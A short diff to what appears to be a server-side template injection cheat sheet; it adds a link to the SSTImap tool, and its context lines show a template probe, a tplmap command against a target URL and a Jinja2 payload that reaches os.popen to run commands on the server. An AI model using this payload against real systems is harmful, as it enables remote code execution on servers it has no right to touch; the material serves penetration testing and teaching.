@@ -14,6 +14,7 @@ ${7*7}               # JSP / Spring
 
 ★ Automation Tools
 tplmap -u http://target.com/page?name=INJECT_HERE
+https://github.com/vladko312/SSTImap
 
 🌚 Step 2: Jinja2 payloads :
 {{ ''.__class__.__base__.__subclasses__()[189].__init__.__globals__['sys'].modules['os'].popen("id").read() }}
